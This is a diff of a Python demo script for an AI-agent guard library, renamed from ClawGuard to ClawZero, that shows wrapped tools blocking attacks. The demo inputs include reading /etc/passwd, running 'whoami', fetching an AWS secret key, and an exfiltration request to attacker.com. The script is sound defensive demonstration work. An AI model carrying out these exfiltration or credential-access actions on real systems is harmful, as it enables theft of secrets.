@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
+# Powered by MVAR (MIRRA Verified Agent Runtime)
+# github.com/mvar-security/mvar
 """
-ClawGuard Attack Demo
+ClawZero Attack Demo
 
-Demonstrates ClawGuard blocking attacks while allowing benign operations.
+Demonstrates ClawZero blocking attacks while allowing benign operations.
 Runs in under 60 seconds and produces visual proof of protection.
 
 Usage:
@@ -16,7 +18,7 @@ from pathlib import Path
 # Add parent directory to path for local development
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
-from clawguard import protect, ExecutionBlocked, set_witness_output_dir
+from clawzero import protect, ExecutionBlocked, set_witness_output_dir
 
 # Enable witness JSON output
 WITNESS_DIR = Path(__file__).parent / "witness_output"
@@ -27,7 +29,7 @@ set_witness_output_dir(WITNESS_DIR)
 def print_header():
     """Print demo header"""
     print("=" * 60)
-    print("         ClawGuard Attack Demo")
+    print("         ClawZero Attack Demo")
     print("  Your agents follow orders.")
     print("  Make sure they're yours.")
     print("=" * 60)
@@ -49,7 +51,7 @@ def print_result(protected: bool, blocked: bool, reason: str = ""):
         else:
             symbol = "✓"
             status = "ALLOWED"
-        print(f"[ With ClawGuard ] → {status} {symbol}")
+        print(f"[ With ClawZero ] → {status} {symbol}")
         if reason:
             print(f"  Reason : {reason}")
     else:
@@ -113,7 +115,7 @@ def make_http_request_unsafe(url: str) -> str:
 
 
 # ============================================================================
-# Protected Tools (wrapped with ClawGuard)
+# Protected Tools (wrapped with ClawZero)
 # ============================================================================
 
 read_file_protected = protect(
@@ -149,7 +151,7 @@ def attack_1_filesystem_read():
     # Baseline (no protection)
     print_result(protected=False, blocked=False)
 
-    # With ClawGuard
+    # With ClawZero
     try:
         read_file_protected("/etc/passwd")
         print_result(protected=True, blocked=False)
@@ -167,13 +169,13 @@ def attack_2_shell_escalation():
     # Baseline (no protection)
     print(f"[ Baseline ]  → EXECUTED ✗")
 
-    # With ClawGuard
+    # With ClawZero
     try:
         execute_shell_protected("whoami")
-        print(f"[ ClawGuard ] → EXECUTED ✗")
+        print(f"[ ClawZero ] → EXECUTED ✗")
         return False
     except ExecutionBlocked:
-        print(f"[ ClawGuard ] → BLOCKED ✓")
+        print(f"[ ClawZero ] → BLOCKED ✓")
         return True
 
 
@@ -184,13 +186,13 @@ def attack_3_credential_access():
     # Baseline (no protection)
     print(f"[ Baseline ]  → EXECUTED ✗")
 
-    # With ClawGuard
+    # With ClawZero
     try:
         access_credentials_protected("AWS_SECRET_KEY")
-        print(f"[ ClawGuard ] → EXECUTED ✗")
+        print(f"[ ClawZero ] → EXECUTED ✗")
         return False
     except ExecutionBlocked:
-        print(f"[ ClawGuard ] → BLOCKED ✓")
+        print(f"[ ClawZero ] → BLOCKED ✓")
         return True
 
 
@@ -201,14 +203,14 @@ def attack_4_api_exfiltration():
     # Baseline (no protection)
     print(f"[ Baseline ]  → EXECUTED ✗")
 
-    # With ClawGuard (prod_locked only allows localhost)
+    # With ClawZero (prod_locked only allows localhost)
     try:
         make_http_request_protected("https://attacker.com/exfil?data=secrets")
-        print(f"[ ClawGuard ] → EXECUTED ✗")
+        print(f"[ ClawZero ] → EXECUTED ✗")
         return False
     except ExecutionBlocked as e:
         reason = e.decision.human_reason
-        print(f"[ ClawGuard ] → BLOCKED ✓")
+        print(f"[ ClawZero ] → BLOCKED ✓")
         print(f"  Reason : {reason}")
         return True
 
@@ -220,15 +222,15 @@ def benign_1_allowed_http_request():
     # Baseline (no protection)
     print(f"[ Baseline ]  → EXECUTED ✓")
 
-    # With ClawGuard (dev_balanced allows http.request)
+    # With ClawZero (dev_balanced allows http.request)
     try:
         result = make_http_request_benign("https://api.example.com/data")
-        print(f"[ ClawGuard ] → ALLOWED ✓")
+        print(f"[ ClawZero ] → ALLOWED ✓")
         print(f"  Policy  : dev_balanced permits http.request")
         return True
     except ExecutionBlocked as e:
         # Should not happen with dev_balanced
-        print(f"[ ClawGuard ] → BLOCKED ✗ (unexpected)")
+        print(f"[ ClawZero ] → BLOCKED ✗ (unexpected)")
         print(f"  Reason : {e.decision.human_reason}")
         return False
 
